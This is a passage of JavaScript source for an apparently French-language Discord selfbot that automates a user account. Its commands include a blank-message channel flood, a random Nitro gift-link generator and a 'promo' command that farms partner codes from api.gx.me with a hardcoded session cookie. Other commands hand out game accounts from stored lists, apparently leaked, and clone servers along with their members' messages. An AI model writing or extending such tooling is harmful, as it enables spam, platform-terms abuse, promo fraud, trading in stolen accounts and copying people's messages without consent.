            message.edit("\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
            for (let i = 0; i < 5; i++){
                message.channel.send("\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n").catch(() => false)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createtext")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Channel").catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createvoice")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Channel", {type: "GUILD_VOICE"}).catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createstage")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Channel", {type: "GUILD_STAGE_VOICE"}).catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createcategory")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Category", {type: "GUILD_CATEGORY"}).catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createnew")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Category", {type: "GUILD_NEWS"}).catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "createforum")){
            if (!message.guild) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            const c = await message.guild.channels.create(args.join(' ') || "RSZ Category", {type: "GUILD_FORUM"}).catch(() => false)
            if (!c) return message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon n' pas pu être crée*`)
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${c} a été crée*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "rename channel")){
            if (!message.guild) return message.edit(`ガ __**${name} - Rename Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || message.channel
            if (!channel.editable) return message.edit(`ガ __**${name} - Rename Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            channel.setName(args.slice(1).join(' '))
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${channel} a été renommé*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "delete channel")){
            if (!message.guild) return message.edit(`ガ __**${name} - Delete Channel**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1]) || message.channel
            if (!channel.deletable) return message.edit(`ガ __**${name} - Delete Channel**__ ガ\n> *Vous n'avez pas les permissions d'utiliser cette commande*`)
        
            channel.delete()
            message.edit(`ガ __**${name} - Create Channel**__ ガ\n> *Le salon ${channel.name} a été supprimé*`)
        }











































        // Commandes NSFW

        else if (message.content === prefix + "4k"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=4K`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "anal"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=anal`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "ass"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=ass`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "boobs"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=boobs`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hanal"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hanal`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hass"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hass`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hboobs"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hboobs`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hentai"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hentai`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hkitsune"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hkitsune`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hmidriff"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hmidriff`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "hneko"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=hneko`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "holo"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=holo`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "kemonomimi"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=kemonomimi`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "neko"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=neko`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "pgif"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=pgif`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "pussy"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=pussy`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }

        else if (message.content === prefix + "yaoi"){
            if (!nsfw !== "on" && !nsfw) return;
            const response = await fetch(`https://nekobot.xyz/api/image?type=yaoi`)
            const data = await response.json()
            message.edit(`ガ __**${name} - NSFW**__ ガ\n> *${data.message} *`)
        }






























        // Commandes gen

        else if (message.content === prefix + "nitro"){
            message.edit(`ガ __**${name} - Nitro**__ ガ\n> *https://discord.gift/${nitrocode(16, '0aA')} *`)
        }

        else if (message.content === prefix + "promo"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const headers = {
                'accept': 'application/json',
                'accept-language': 'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
                'authority': 'api.gx.me',
                'cookie': 'SESSION_TYPE=user; SESSION=NzFjMjg3NDAtMDhkOC00ODkwLWJhNzEtODA0YTcwMjNiM2U0',
                'origin': 'https://www.opera.com',
                'referer': 'https://www.opera.com/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Opera GX";v="107", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0',              };
              
            const res = await fetch("https://api.gx.me/profile/token", { headers: headers})
            const data = await res.json()
            message.edit(`ガ __**${name} - Nitro Promo**__ ガ\n> [Lien Nitro Promo](<https://discord.com/billing/partner-promotions/1180231712274387115/${data.data}>)`)
        }

        else if (message.content === prefix + "lol"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.interval["gen"] === true) return message.edit(`ガ __**${name} - League of Legends**__ ガ\n> Veuillez attendre la fin de votre génération`)
            client.interval["gen"] = true
            message.edit(`ガ __**${name} - League of Legends**__ ガ\n> Veuillez attendre <t:${Math.round((Date.now() + 1000 * 15) / 1000)}:R>`)
            await client.sleep(15000)
            message.edit(`ガ __**${name} - League of Legends**__ ガ\n> ${gens.lol[Math.floor(Math.random() * gens.lol.length)]}`)
            delete client.interval["gen"]
        }

        else if (message.content === prefix + "roblox"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (client.interval["gen"] === true) return message.edit(`ガ __**${name} - Roblox**__ ガ\n> Veuillez attendre la fin de votre génération`)
            client.interval["gen"] = true
            message.edit(`ガ __**${name} - Roblox**__ ガ\n> Veuillez attendre <t:${Math.round((Date.now() + 1000 * 15) / 1000)}:R>`)
            await client.sleep(15000)
            message.edit(`ガ __**${name} - Roblox**__ ガ\n> ${gens.roblox[Math.floor(Math.random() * gens.roblox.length)]}`)
            delete client.interval["gen"]
        }

        else if (message.content === prefix + "color"){
            const couleur = Math.floor(Math.random()*16777215).toString(16);
            message.edit(`ガ __**${name} - Color**__ ガ\n> *Voici votre couleur: #${couleur}*`)
        }
























































        // Commandes Systeme

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setprefix")){
            if (!args[0]) return message.edit(`ガ __**${name} - Set Prefix**__ ガ\n> *Veuillez entrer un nouveau prefix*`)
            prefix = args[0]
            message.edit(`ガ __**${name} - Set Prefix**__ ガ\n> *Le nouveau prefix est maintenant \`${args[0]}\`*`)
        }

        else if (cmd.slice(0, 1).join(' ') === ("settwitch")){
            if (!args[0]) return message.edit(`ガ __**${name} - Set Twitch**__ ガ\n> *Veuillez entrer un pseudo twitch valide*`)
            twitch = `https://twitch.tv/${args[0]}`
            message.edit(`ガ __**${name} - Set Twitch**__ ガ\n> *Le lien twitch est maintenant \`https://twitch.tv/${args[0]}\`*`)
        }

        else if (message.content === prefix + "plateforme"){
            message.edit(`ガ __**${name} - Plateforme**__ ガ\n> *Voici votre plateforme: \`${os.platform()}\`*`)
        }

        else if (cmd.slice(0, 1).join(' ') === prefix + "theme"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const themes = [ "rsz", "speed", "k3s" ]
            if (!args[0] || !themes.includes(args[0])) return message.edit(`ガ __**${name} - Theme**__ ガ\n> *Veuillez choisir un de ses thèmes: ${themes.map(r => `\`${r}\``).join(', ')}*`)
        
            tools.theme = args[0]
            client.save(`${dir || __dirname}/Data/Tools/tools.json`, tools)
            message.edit(`ガ __**${name} - Theme**__ ガ\n> *Votre thème a été modifiée*`)
        }

        else if (cmd.slice(0, 1).join(' ') === prefix + "premium"){
            if (args[0]){
                if (client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous êtes déjà un membre premium*`)
                
                const r2 = await fetch(aaa)
                const a = await r2.json()
        
                if (!a.premium.includes(args[0])) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Le code n'est pas valide*`)
                client.premium = true
                message.edit(`ガ __**${name} - Premium**__ ガ\n> *Le code premium a été utilisé avec succès*`)
            }
            else {
                if (client.premium) message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous êtes certifié premium par la Team R$Z*`)
                else return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous n'avez pas de premium..*`)    
            }
        }

        else if (message.content === prefix + "sinfo"){
            let totalSeconds = (client.uptime / 1000);
            let days = Math.floor(totalSeconds / 86400);
            totalSeconds %= 86400;
            let hours = Math.floor(totalSeconds / 3600);
            totalSeconds %= 3600;
            let minutes = Math.floor(totalSeconds / 60);
            let seconds = Math.floor(totalSeconds % 60);
    
            function pourcentageCPUutilise() {
                const cpu = os.cpus();
                const cpuTotal = cpu.length;
                const cpuLibre = cpu.filter(core => core.times?.idle === 0).length;
            
                const pourcentage = ((cpuTotal - cpuLibre) / cpuTotal) * 100;
                return pourcentage;
            }

            message.edit(`ガ __**${name} - Infos**__ ガ\n> **𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲** ${client.separator} \`${client.user.username}\`
            > **𝗩𝗲𝗿𝘀𝗶𝗼𝗻** ${client.separator} \`${versionself}\`
            > **𝗣𝗿𝗲𝗳𝗶𝘅** ${client.separator} \`${prefix}\`

            > **𝗔𝟮𝗳** ${client.separator} \`${client.user.mfaEnabled ? "Oui" : "Non"}\`
            > **𝗽𝗼𝗿𝘁𝗮𝗯𝗹𝗲 𝘀𝘂𝗿 𝗹𝗲 𝗰𝗼𝗺𝗽𝘁𝗲** ${client.separator} \`${client.user.phoneNumber ? "Oui" : "Non"}\`
            > **𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀** ${client.separator} \`${client.channels.cache.size}\`
            > **𝗔𝗺𝗶𝘀** ${client.separator} \`${client.relationships.friendCache.size}\`
            > **𝗦𝗲𝗿𝘃𝗲𝘂𝗿** ${client.separator} \`${client.guilds.cache.size}\`

            > **𝗲𝗺𝗮𝗶𝗹 𝘃𝗲𝗿𝗶𝗳** ${client.separator} \`${client.user.verified ? "Oui" : "Non"}\`
            > **𝗨𝘀𝗲𝗿𝘀** ${client.separator} \`${client.users.cache.size}\`
            > **𝗠𝗲𝗺𝗼𝗶𝗿𝗲 𝗨𝘀𝗮𝗴𝗲 (Ram)** ${client.separator} \`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} / ${(os.totalmem() / 1024 / 1024).toFixed(2)} MB\`

            > **Arch** ${client.separator} \`${process.arch}\`
            > **Version Node** ${client.separator} \`${process.version}\`
            > **Discord.js** ${client.separator} \`${discord.version}\`

            > **CPU** ${client.separator} \`${os.cpus().map(i => `${i.model}`)[0]}\`
            > **𝗨𝗽𝘁𝗶𝗺𝗲** ${client.separator} \`${days} Jours | ${hours} heures | ${minutes} minutes | ${seconds} secondes\``.replaceAll('            ', ''))
        }



































































        // Commandes Backups

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup speed")){
            const guild = client.guilds.cache.get(args[1]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            message.delete().catch(() => false)

            let data = {};
            const id = makeid(16);
            const channels = guild.channels.cache
                .sort(function(a, b) {
                    return a.position - b.position;
                })
                .map(c => {
                    const channel = {
                        type: c.type,
                        name: c.name,
                        postion: c.position,
                        permissions: c.permissionOverwrites?.cache.filter(p => p.type === "role").map(p => ({
                            roleName: c.guild.roles.cache.get(p.id).name,
                            allow: p.allow.bitfield.toString(),
                            deny: p.deny.bitfield.toString()
                        })) || []
                    };
                    if (c.parent) channel.parent = c.parent.name;
                    return channel;
                });

            const roles = guild.roles.cache
                .filter(r => r.id !== guild.id)
                .sort(function(a, b) {
                    return a.position - b.position;
                })
                .map(r => {
                    const role = {
                        name: r.name,
                        color: r.color,
                        hoist: r.hoist,
                        permissions: r.permissions,
                        mentionable: r.mentionable,
                        position: r.position
                    };
                    return role;
                });

            data = {
                id,
                icon: guild.iconURL(),
                banner: guild.bannerURL(),
                splash: guild.splashURL(),
                name: guild.name,
                owner: guild.ownerId,
                members: guild.memberCount,
                createdAt: guild.createdAt,
                createdTimestamp: Date.now(),
                roles,
                channels
            };

            client.save(`${__dirname}/Data/Backups/guilds/${id}.json`, data)
            
            const newguild = await client.guilds.create(`${name} PROJECT`).catch(() => false)
            if (!newguild) return message.channel.send(`ガ __**${name} - Backup**__ ガ\n> *Impossible de crée un serveur.*`).catch(() => false)

            newguild.roles.cache.filter(r => r.deletable).forEach(role => role.delete("R$Z Backup Load").catch(() => false));
            newguild.channels.cache.forEach(channel => channel.delete("R$Z Backup Load").catch(() => false));
                
            try{
                for await (const role of data.roles.map(r => r)){
                    newguild.roles.create({
                        name: role.name,
                        color: role.color,
                        permissions: role.permissions,
                        hoist: role.hoist,
                        mentionable: role.mentionable,
                        position: role.position
                    })
                    .then(role => role.setPosition(role.position));
                }
            }
            catch {}
            finally {
                data.channels
                .filter(c => c.type === "GUILD_CATEGORY")
                .forEach(async function(ch) {
                    const finalPermissions = [];
    
                    const channel = await newguild.channels.create(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    });
    
                    ch.permissions.forEach(async (perm) => {
                        const role = newguild.roles.cache.find((r) => r.name === perm.roleName);
                        if (role) {
                            finalPermissions.push({
                                id: role.id,
                                allow: BigInt(perm.allow),
                                deny: BigInt(perm.deny)
                            });
                        }
                    });
                    await channel.permissionOverwrites.set(finalPermissions);
                });
    
                data.channels
                .filter(c => c.type !== "GUILD_CATEGORY")
                .forEach(async function(ch) {

                    await newguild.channels.create(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    }).then(async c => {
                        const finalPermissions = [];
    
                        const parent = newguild.channels.cache
                            .filter(c => c.type === "GUILD_CATEGORY")
                            .find(c => c.name === ch.parent);
                        ch.parent ? c.setParent(parent) : "";
    
                        ch.permissions.forEach((perm) => {
    
                            const role = newguild.roles.cache.find((r) => r.name === perm.roleName);
                            if (role) {
                                finalPermissions.push({
                                    id: role.id,
                                    allow: BigInt(perm.allow),
                                    deny: BigInt(perm.deny)
                                });
                            }
                        });
                        await c.permissionOverwrites.set(finalPermissions);
                    });
                });
            }
    
            newguild.setName(data.name).catch(() => false);
            newguild.setIcon(data.icon).catch(() => false);
            newguild.setBanner(data.banner).catch(() => false);
            newguild.setSplash(data.splash).catch(() => false);
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup create")){
            const guild = client.guilds.cache.get(args[1]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            let data = {};
            const id = makeid(16);
            const channels = guild.channels.cache
                .sort(function(a, b) {
                    return a.position - b.position;
                })
                .map(c => {
                    const channel = {
                        type: c.type,
                        name: c.name,
                        postion: c.position,
                        permissions: c.permissionOverwrites?.cache.filter(p => p.type === "role").map(p => ({
                            roleName: c.guild.roles.cache.get(p.id).name,
                            allow: p.allow.bitfield.toString(),
                            deny: p.deny.bitfield.toString()
                        })) || []
                    };
                    if (c.parent) channel.parent = c.parent.name;
                    return channel;
                });

            const roles = guild.roles.cache
                .filter(r => r.id !== guild.id)
                .sort(function(a, b) {
                    return a.position - b.position;
                })
                .map(r => {
                    const role = {
                        name: r.name,
                        color: r.color,
                        hoist: r.hoist,
                        permissions: r.permissions,
                        mentionable: r.mentionable,
                        position: r.position
                    };
                    return role;
                });

            data = {
                id,
                icon: guild.iconURL(),
                banner: guild.bannerURL(),
                splash: guild.splashURL(),
                name: guild.name,
                owner: guild.ownerId,
                members: guild.memberCount,
                createdAt: guild.createdAt,
                createdTimestamp: Date.now(),
                roles,
                channels
            };

            client.save(`${__dirname}/Data/Backups/guilds/${id}.json`, data)
            message.edit(`ガ __**${name} - Backup**__ ガ\n> *Création de la backup terminée. (\`${prefix}backup load ${id}\`)*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup emotes")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[1]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            const backupid = makeid(16)
            const er = new Array()
            guild.emojis.cache.forEach(e => er.push(`"${e.toString()}"`))
            if (!fs.existsSync(`${__dirname}/Data/Backups/emotes/${backupid}.json`)) fs.writeFileSync(`${__dirname}/Data/Backups/emotes/${backupid}.json`, `{\n        "emojis": [${er}],\n        "name": "${guild.name}",\n        "code": "${backupid}",\n        "size": "${guild.emojis.cache.size}"\n}`)            
            message.edit(`ガ __**${name} - Backup**__ ガ\n> *Création de la backup des emotes terminée. (\`${prefix}backup load ${backupid}\`)*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup msg")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[1]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            await message.edit(`ガ __**${name} - Backup**__ ガ\n> *Création de la backup avec les messages en cours*`);

            const id = makeid(16);

            async function create(){
                let data = {};

            const channelPromises = guild.channels.cache
                .sort((a, b) => a.position - b.position)
                .map(async c => {
                    const channel = {
                        type: c.type,
                        name: c.name,
                        position: c.position,
                        permissions: c.permissionOverwrites?.cache.filter(p => p.type === "role").map(p => ({
                            roleName: c.guild.roles.cache.get(p.id).name,
                            allow: p.allow.bitfield.toString(),
                            deny: p.deny.bitfield.toString()
                        })) || [],
                    };
                    if (c.parent) channel.parent = c.parent.name;
                    channel.messages = await fetchChannelMessages(c) || []
                    return channel;
                });

            Promise.all(channelPromises)
                .then(channels => {
                    const roles = guild.roles.cache
                        .filter(r => r.id !== guild.id)
                        .sort((a, b) => a.position - b.position)
                        .map(r => ({
                            name: r.name,
                            color: r.color,
                            hoist: r.hoist,
                            permissions: r.permissions,
                            mentionable: r.mentionable,
                            position: r.position
                        }));

                        

                    data = {
                        id,
                        icon: guild.iconURL(),
                        banner: guild.bannerURL(),
                        splash: guild.splashURL(),
                        name: guild.name,
                        owner: guild.ownerId,
                        members: guild.memberCount,
                        createdAt: guild.createdAt,
                        createdTimestamp: Date.now(),
                        roles,
                        channels
                    };
                    client.save(`${__dirname}/Data/Backups/guilds/${id}.json`, data)
                    message.edit(`ガ __**${name} - Backup**__ ガ\n> *Création de la backup terminée. (\`${prefix}backup load ${id}\`)*`);
                })
                .catch(() => false);

            function fetchChannelMessages(channel) {
                if (!channel.messages) return;
                return channel.messages.fetch({ limit: 100 })
                    .then(fetched => {
                        if (!fetched) return [];
                        let messageCount = 99;
                        let messages = [];
                        for (const [_, msg] of fetched) {
                            if (!msg.author || messages.length >= messageCount) continue;
                            const files = [];
                            for (const a of msg.attachments) {
                                let attach = a.url;
                                if (a.url && ['png', 'jpg', 'jpeg', 'jpe', 'jif', 'jfif', 'jfi'].includes(a.url)) {
                                    return fetch(a.url)
                                        .then(res => res.buffer())
                                        .then(buffer => {
                                            attach = buffer.toString('base64');
                                            return {
                                                name: a.name,
                                                attachment: attach
                                            };
                                        });
                                } else {
                                    files.push({
                                        name: a.name,
                                        attachment: attach
                                    });
                                }
                            }
                            messages.push({
                                username: msg.author.username,
                                avatar: msg.author.displayAvatarURL(),
                                content: msg.cleanContent,
                                embeds: msg.embeds,
                                files,
                                pinned: msg.pinned,
                                sentAt: msg.createdAt.toISOString(),
                            });
                            if (messages.length >= messageCount) break;
                        }
                        return messages;
                    })
                    .catch(() => {
                        return [];
                    });
                }
            }

            await create()
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup all")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            message.edit(`ガ __**${name} Backup All**__ ガ\n> *Création de toutes les backups en cours...*`)

            const data = {}
            const id = makeid(16)
            await client.user.fetchFlags()
            data.username = client.user.username
            data.globalName = client.user.globalName
            data.avatar = client.user.avatar ? (await (fetch(client.user.displayAvatarURL({ dynamic: true })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.banner = client.user.banner ? (await (fetch(client.user.bannerURL({ dynamic: true })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.decoration = client.user.avatarDecoration ? (await (fetch(client.user.avatarDecorationURL({ format: "webp" })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.pronom = client.user.pronouns || null
            data.aboutme = client.user.bio || null
            data.theme = client.settings.theme
            data.presence = client.user.presence.status || null
            data.colors = client.user.themeColors ?? client.user.accentColor ?? null
            data.badges = client.user.flags.toArray()
            data.statustext = client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.state).length > 0 ? client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.state)[0].state : null
            data.statusemoji = client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.emoji).length > 0 ? client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.emoji)[0].emoji : null
            
            client.save(`${__dirname}/Data/Backups/account/${id}.json`, data)


            const ids = []
            await client.relationships.fetch()
            client.relationships.friendCache.forEach(f => f?.id ? ids.push(f?.id) : "")
    
            client.save(`${__dirname}/Data/Backups/friends/${id}.json`, ids)


            let data2 = ""
